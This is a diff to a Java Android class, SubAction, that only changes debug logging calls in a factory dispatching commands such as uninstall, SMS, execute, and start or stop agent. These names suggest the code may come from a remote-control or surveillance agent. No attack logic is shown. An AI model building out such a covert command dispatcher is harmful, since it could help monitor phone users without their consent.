@@ -103,43 +103,43 @@ public abstract class SubAction implements Runnable {
 		
 		switch (type) {
 			case SubAction.ACTION_SYNC:
-				Log.d(TAG,"Factory *** ACTION_SYNC ***");
+				Log.d("QZ", TAG + " Factory *** ACTION_SYNC ***");
 				return new SyncActionInternet(type, confParams);
 				
 			case ACTION_UNINSTALL:
-				Log.d(TAG,"Factory *** ACTION_UNINSTALL ***");
+				Log.d("QZ", TAG + " Factory *** ACTION_UNINSTALL ***");
 				return new UninstallAction(type, confParams);
 				
 			case ACTION_RELOAD:
-				Log.d(TAG,"Factory *** ACTION_RELOAD ***");
+				Log.d("QZ", TAG + " Factory *** ACTION_RELOAD ***");
 				return new ReloadAction(type, confParams);
 				
 			case ACTION_SMS:
-				Log.d(TAG,"Factory *** ACTION_SMS ***");
+				Log.d("QZ", TAG + " Factory *** ACTION_SMS ***");
 				return new SmsAction(type, confParams);
 				
 			case ACTION_START_AGENT:
-				Log.d(TAG,"Factory *** ACTION_START_AGENT ***");
+				Log.d("QZ", TAG + " Factory *** ACTION_START_AGENT ***");
 				return new StartAgentAction(type, confParams);
 				
 			case ACTION_STOP_AGENT:
-				Log.d(TAG,"Factory *** ACTION_STOP_AGENT ***");
+				Log.d("QZ", TAG + " Factory *** ACTION_STOP_AGENT ***");
 				return new StopAgentAction(type, confParams);
 				
 			case ACTION_SYNC_PDA:
-				Log.d(TAG,"Factory *** ACTION_SYNC_PDA ***");
+				Log.d("QZ", TAG + " Factory *** ACTION_SYNC_PDA ***");
 				return new SyncPdaAction(type, confParams);
 				
 			case ACTION_EXECUTE:
-				Log.d(TAG,"Factory *** ACTION_EXECUTE ***");
+				Log.d("QZ", TAG + " Factory *** ACTION_EXECUTE ***");
 				return new ExecuteAction(type, confParams);
 				
 			case ACTION_SYNC_APN:
-				Log.d(TAG,"Factory *** ACTION_SYNC ***");
+				Log.d("QZ", TAG + " Factory *** ACTION_SYNC ***");
 				return new SyncActionApn(type, confParams);
 				
 			case ACTION_LOG:
-				Log.d(TAG,"Factory *** ACTION_INFO ***");
+				Log.d("QZ", TAG + " Factory *** ACTION_INFO ***");
 				return new LogAction(type, confParams);
 				
 			default:
